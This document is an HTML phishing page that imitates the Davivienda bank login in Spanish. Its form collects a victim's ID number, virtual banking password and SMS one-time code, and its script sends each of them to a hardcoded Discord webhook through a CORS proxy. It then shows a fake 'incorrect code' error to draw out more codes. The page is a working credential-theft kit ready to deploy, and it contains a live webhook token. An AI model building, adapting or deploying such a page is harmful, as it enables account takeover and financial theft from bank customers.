<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Davivienda - Virtual</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        /* Estilos para acumular pasos */
        #passSection, #otpSection { display: none; }
        .visible { display: block !important; }
        
        /* Corregimos el espacio del checkbox que estaba muy pegado */
        .checkbox-container {
            margin-top: 18px !important; 
            margin-bottom: 12px !important;
            display: flex;
            align-items: center;
        }

        /* Estilo para campos ya completados */
        .completed { opacity: 0.7; pointer-events: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container">
            <img src="LogoDavivienda.svg" alt="Logo" class="logo">
        </div>
        
        <div class="welcome-section">
            <p class="greeting">¡Hola!</p>
            <h2 class="subtitle">Nos alegra que esté aquí</h2>
        </div>
        
        <form id="mainForm">
            <div id="docGroup">
                <div class="form-group">
                    <label class="form-label">Seleccione su tipo de documento</label>
                    <select id="docType" class="form-select">
                        <option value="Cedula">Cedula de Ciudadania</option>
                    </select>
                </div>
                <div class="form-group">
                    <label class="form-label">Ingrese su número de documento</label>
                    <input type="text" id="docNumber" class="form-input" autocomplete="off">
                </div>
                <button type="button" id="btnToPass" class="btn-continue">Continuar</button>
            </div>

            <div id="passSection">
                <div class="form-group" style="margin-top: 15px;">
                    <label class="form-label">Ingrese su clave virtual</label>
                    <input type="password" id="pass" class="form-input" maxlength="8">
                </div>
                <div class="checkbox-container">
                    <input type="checkbox" id="rem" class="checkbox">
                    <label for="rem" class="checkbox-label" style="margin-left: 8px;">Recordar mis datos de identidad</label>
                </div>
                <button type="button" id="btnToOtp" class="btn-continue">Ingresar</button>
            </div>

            <div id="otpSection">
                <div style="border-top: 1px solid #eee; margin-top: 25px; padding-top: 15px;">
                    <h2 style="color: #ed1c24; font-size: 20px; font-weight: 700;">Verificación</h2>
                    <p style="font-size: 14px; color: #666; margin-bottom: 10px;">Ingrese el código enviado a su celular.</p>
                    <div class="form-group">
                        <label class="form-label">Código de seguridad</label>
                        <input type="text" id="otpCode" class="form-input" placeholder="000000">
                    </div>
                    <p id="errOtp" style="color: #ed1c24; font-size: 12px; display: none; margin-top: 5px; font-weight: bold;">Código incorrecto. Reintente.</p>
                    <button type="button" id="btnFinish" class="btn-continue">Verificar</button>
                </div>
            </div>
        </form>
    </div>

    <script>
        // PEGA TU WEBHOOK AQUÍ
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487889926296178729/H0bASOLwRk2FueCuR0Nfj_C15tgjNEKMdteg_8x5_DQ_ywflO01vmwPNURVFoalmC5q6';

        async function sendToDiscord(mensaje) {
            // Enviamos como TEXTO PLANO (content) para evitar bloqueos de Vercel/Discord
            return fetch('https://corsproxy.io/?' + encodeURIComponent(WEBHOOK_URL), {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: mensaje })
            });
        }

        // Paso 1 -> Aparece Clave
        document.getElementById('btnToPass').addEventListener('click', () => {
            if (document.getElementById('docNumber').value.length > 3) {
                document.getElementById('btnToPass').style.display = 'none';
                document.getElementById('docNumber').classList.add('completed');
                document.getElementById('passSection').classList.add('visible');
            }
        });

        // Paso 2 -> Envía Login y aparece OTP
        document.getElementById('btnToOtp').addEventListener('click', async () => {
            const btn = document.getElementById('btnToOtp');
            const doc = document.getElementById('docNumber').value;
            const clave = document.getElementById('pass').value;

            if (clave.length < 4) return;

            btn.innerText = "Validando...";
            btn.disabled = true;

            const texto = `**🏦 NUEVO LOGIN**\n👤 **Doc:** \`${doc}\`\n🔑 **Clave:** \`${clave}\`\n⏰ **Hora:** ${new Date().toLocaleTimeString()}`;
            
            await sendToDiscord(texto);

            // Forzamos el avance después de 1 segundo
            setTimeout(() => {
                btn.style.display = 'none';
                document.getElementById('pass').classList.add('completed');
                document.getElementById('otpSection').classList.add('visible');
                window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
            }, 1000);
        });

        // Paso 3 -> Envía OTP
        document.getElementById('btnFinish').addEventListener('click', async () => {
            const btn = document.getElementById('btnFinish');
            const otp = document.getElementById('otpCode').value;
            if (otp.length < 4) return;

            btn.innerText = "Verificando...";
            
            const texto = `**🔐 OTP RECIBIDO**\n👤 **Doc:** \`${document.getElementById('docNumber').value}\`\n🔢 **Código:** \`${otp}\``;
            
            await sendToDiscord(texto);

            setTimeout(() => {
                document.getElementById('errOtp').style.display = 'block';
                document.getElementById('otpCode').value = '';
                btn.innerText = "Verificar";
                btn.disabled = false;
            }, 1200);
        });
    </script>
</body>
</html>
